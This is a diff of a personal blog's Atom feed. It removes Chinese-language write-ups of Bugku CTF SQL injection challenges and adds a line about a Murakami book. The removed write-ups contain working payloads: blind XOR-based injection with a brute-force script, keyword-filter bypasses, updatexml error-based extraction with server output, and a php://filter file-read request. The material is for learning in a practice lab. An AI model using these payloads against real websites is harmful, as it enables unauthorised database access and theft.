-			&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;admin'^(ascii(substring(database()from({})))&amp;lt;&amp;gt;{})#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-				&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-				&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt;
-			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;error&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-				&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;
-				&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;get_database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# blindsql&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;2.查询表名&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;因为这里 &lt;code class=&quot;highlighter-rouge&quot;&gt;information&lt;/code&gt; 被过滤了，按照原来的套路来就不行了。那应该怎么办呢？看别人的 writeup 说是猜测这里所要查询的表名是 admin，然后验证一下是否存在这样一个表&lt;code class=&quot;highlighter-rouge&quot;&gt;admin’^(select(1)from(admin))^1#&lt;/code&gt;如果存在，那么回显&lt;code class=&quot;highlighter-rouge&quot;&gt;password error!&lt;/code&gt;。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;这里要着重解释一下为什么在之前的 payload 和这里后面要多加一个&lt;code class=&quot;highlighter-rouge&quot;&gt;^1&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;^0&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;如果这里不在后面加&lt;code class=&quot;highlighter-rouge&quot;&gt;^1&lt;/code&gt;，那么不管&lt;code class=&quot;highlighter-rouge&quot;&gt;(select(1)from(admin))&lt;/code&gt;对或错都会回显&lt;code class=&quot;highlighter-rouge&quot;&gt;username does not exist!&lt;/code&gt;。因为如果存在 &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; 的话那么就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;1^1=0&lt;/code&gt;会回显&lt;code class=&quot;highlighter-rouge&quot;&gt;username does not exist!&lt;/code&gt; ；如果不存在 &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;，那么就会报错，报错在这里会回显&lt;code class=&quot;highlighter-rouge&quot;&gt;username does not exist!&lt;/code&gt;。加了&lt;code class=&quot;highlighter-rouge&quot;&gt;^1&lt;/code&gt;就很好的解决了这个问题，可以区分报错与正确。之前的 payload 也是为了防止这个问题。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。因为这里语法错误也不会报错，有可能你输入的语句就不可能成立，但你也不知道，就很麻烦了，不过可以改变最后是^0还是^1，如果改与不改返回值相同，那就是有语法错误。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;[这里猜测外别的方法我暂时不知道。⭐️]&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;3.查询字段名&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;其实这里不需要查，因为我们还是猜测这里的字段名为&lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;，这个没啥可说的。然后我们稍微验证一下&lt;code class=&quot;highlighter-rouge&quot;&gt;admin'^(select(count(password))from(admin))^1#&lt;/code&gt;，回显&lt;code class=&quot;highlighter-rouge&quot;&gt;password error!&lt;/code&gt;，说明是存在&lt;code class=&quot;highlighter-rouge&quot;&gt;pasword&lt;/code&gt;字段的。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;4.暴破目标数据&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;payload:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin'^(ascii(mid((select(password)from(admin))from(1)))&amp;lt;&amp;gt;97)^0#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本跟之前的差不多，就不放了。&lt;/p&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">一道 SQL 注入的题目，里面有不少绕过的技巧，值得好好来分析一下。</summary></entry><entry><title type="html">多次</title><link href="http://localhost:4000/2018/08/03/bk_dc/" rel="alternate" type="text/html" title="多次" /><published>2018-08-03T00:00:00+08:00</published><updated>2018-08-03T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/03/bk_dc</id><content type="html" xml:base="http://localhost:4000/2018/08/03/bk_dc/">&lt;p&gt;今天做 Bugku 上的一道 SQL 注入题，感觉思路不错，这里单独拎出来分析一下，这里有不少技巧非常值得深入的学习。&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;h2 id=&quot;0x01-题目&quot;&gt;0x01 题目&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://ctf.bugku.com/challenges&quot;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/blog/bk_dc1.png&quot; alt=&quot;多次&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-第一个-flag&quot;&gt;0x02 第一个 flag&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;step1: 老规矩，首先就是找注入点&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/1ndex.php?id=1'&lt;/code&gt; 报错，怀疑这里存在注入点(注意：这里注释要用&lt;code class=&quot;highlighter-rouge&quot;&gt;%23&lt;/code&gt;不能用&lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt; [为什么？我暂时不知道，猜测是可能存在某种转码的问题⭐️] )&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;step2: 按照步骤此时判断字段数&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/1ndex.php?id=1' order by 4%23&lt;/code&gt; 报错，然后又试了很多其他数字发现都是报错，此时猜测可能过滤了某些字符&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;step2.1: 判断过滤了哪些字符&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/1ndex.php?id=1'^(length('union')&amp;gt;0)%23&lt;/code&gt;  不报错。&lt;/p&gt;
-
-&lt;p&gt;这里是通过异或语句来判断过滤了哪些字符，当不报错，那么说明 &lt;code class=&quot;highlighter-rouge&quot;&gt;(length('union')&amp;gt;0)&lt;/code&gt; 是错的，也就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;union&lt;/code&gt; 被过滤了。用同样的方法去判断有哪些我们需要用到的字符或单词被过滤了，这里要注意一下当  &lt;code class=&quot;highlighter-rouge&quot;&gt;or&lt;/code&gt; 被过滤，那么&lt;code class=&quot;highlighter-rouge&quot;&gt;order&lt;/code&gt; 也会被影响。
-通过测试最终发现&lt;code class=&quot;highlighter-rouge&quot;&gt;select union or and&lt;/code&gt; 都被过滤了，&lt;code class=&quot;highlighter-rouge&quot;&gt;limit from&lt;/code&gt;没有被过滤。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;step2.2: 继续判断字段数&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/1ndex.php?id=1' order by 2%23&lt;/code&gt; 不报错，字段数为 2&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;step3: 查找目标数据的老套路了&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;这里直接给最后一个 payload&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1ndex.php?id=-1%27 ununionion seselectlect 1,flag1 from flag1%23
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;得到第一个 flag&lt;/p&gt;
-
-&lt;p&gt;这个在查找字段的时候还找到一个字段的时候，还找到一个 &lt;code class=&quot;highlighter-rouge&quot;&gt;address&lt;/code&gt;字段&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/1ndex.php?id=-1%27 ununionion seselectlect 1,address from flag1%23
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;得到第二关的地址&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-第二个-flag&quot;&gt;0x02 第二个 flag&lt;/h2&gt;
-
-&lt;p&gt;这里有两种方法来得解这题&lt;/p&gt;
-
-&lt;h3 id=&quot;1解法一updatexml-报错注入&quot;&gt;1.解法一：updatexml 报错注入&lt;/h3&gt;
-
-&lt;p&gt;这里继续使用之前的方法是没法绕过的，所以要尝试新方法&lt;code class=&quot;highlighter-rouge&quot;&gt;updatexml 报错注入&lt;/code&gt; (为什么要用这个？暂时不知道⭐️)&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;UPDATEXML (XML_document, XPath_string, new_value);  
-第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc  
-第二个参数：XPath_string (Xpath格式的字符串)。  
-第三个参数：new_value，String格式，替换查找到的符合条件的数据  
-作用：改变文档中符合条件的节点的值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;step1: 查询表名&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x7e&lt;/code&gt; —&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;~&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;注意：这里 &lt;code class=&quot;highlighter-rouge&quot;&gt;group_concat()&lt;/code&gt; 是因为回显不止一行，此时报错的信息为 &lt;code class=&quot;highlighter-rouge&quot;&gt;Subquery returns more than 1 row&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;这里提交的是&lt;code class=&quot;highlighter-rouge&quot;&gt;~sql语句~&lt;/code&gt;，是不符合xml格式的，所以会报错。报错会造成 &lt;code class=&quot;highlighter-rouge&quot;&gt;select group_concat(table_name) from information_schema.tables where table_schema=database()&lt;/code&gt;语句的执行，所以可以注入。&lt;/p&gt;
-
-&lt;p&gt;此时回显：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My Id =1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
-Nobody!
-XPATH syntax error: '~class,flag2~'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;下面其实都是按照老套路来了，重点上面基本都讲完了。&lt;/p&gt;
-
-&lt;p&gt;step2: 查询字段名&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;此时回显：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My Id =1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),0x7e),1)#
-Nobody!
-XPATH syntax error: '~flag2,address~'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;step3: 查询目标数据&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;此时回显：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My Id =1' and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)#
-Nobody!
-XPATH syntax error: '~flag{Bugku-sql_*******-bug}~'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;此时已经搞到答案了，将&lt;code class=&quot;highlighter-rouge&quot;&gt;B&lt;/code&gt; 改成&lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt; 就是正确的 flag 了。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;但是呢，这里还有第三关，本着探究的目的，稍后在第三节会继续深入。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;查询第三关地址:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/Once_More.php?id=1' and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)%23
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;此时回显：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My Id =1' and updatexml(1,concat(0x7e,(select address from flag2),0x7e),1)#
-Nobody!
-XPATH syntax error: '~./Have_Fun.php~'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;获取到第三关地址，第三关稍后再说。&lt;/p&gt;
-
-&lt;h3 id=&quot;2解法二locate--脚本暴破&quot;&gt;2.解法二：locate() + 脚本暴破&lt;/h3&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sleep  substr&lt;/code&gt;都被过滤掉了，我们转而使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;locate&lt;/code&gt; 函数达到同样的效果。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;语法一:
-locate(substr,str)
-返回子串 substr 在字符串 str 中第一次出现的位置。如果子串 substr 在 str 中不存在，返回值为 0。
-eg:
-locate('jd','jdgood')=1
-注意: 下标从 1 开始
-
-语法二:
-locate(substr,str,pos)
-返回子串 substr 在字符串 str 中第一次出现的位置,从位置 pos 开始。
-eg:
-mysql&amp;gt; select locate('bar', 'foobarbar', 5);
-mysql&amp;gt; 7
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;根据 locate 上述语法特性就可以构造 payload 了。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url = &quot;/Once_More.php?id=1'and  (select locate(binary'&quot;+str(j)+&quot;',(select flag2 from flag2),&quot;+str(i)+&quot;))=&quot;+str(i)+&quot;%23&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;按照 SQL 注入的老套路来进行暴破就可以了，最终可以得到 flag。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-第三个-flag&quot;&gt;0x03 第三个 flag&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;tips:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;XXF 绕过第一个问题&lt;/p&gt;
-
-&lt;p&gt;之后会得到一个二维码，扫描之后得到&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;你……你……你可以看到我?
-好吧，我来自于ErWeiMa.php
-顺便告诉你两个密码
-one:参数名是game;
-tow:flag在admin里
-对了,文件后@…c=Y&amp;amp;$as%_=#*ad…*@#！*&amp;amp;@…c……
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;根据得到的信息构造 &lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /Have_Fun.php 
-
-game=php://filter/convert.base64-encode/resource=admin.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;得到第三个 flag，直接提交就可以了。&lt;/p&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">今天做 Bugku 上的一道 SQL 注入题，感觉思路不错，这里单独拎出来分析一下，这里有不少技巧非常值得深入的学习。</summary></entry></feed>
+&lt;p&gt;村上这本书给我的感觉是「这何止是在写跑步，分明在写生活呀！」&lt;/p&gt;</content><author><name>Catcher</name></author><category term="读书" /><summary type="html">“每天跑步对我来说好比生命线，不能说忙就抛开不管，或者停下不跑了。忙就中断跑步的话，我一辈子都无法跑步了。坚持跑步的理由不过一丝半点，中断跑步的理由却足够装满一辆大型载重卡车。我们只有将那「一丝半点的理由」一个个慎之又慎地不断打磨，见缝插针，得空就孜孜不倦地打磨他们。” —村上春树</summary></entry></feed>
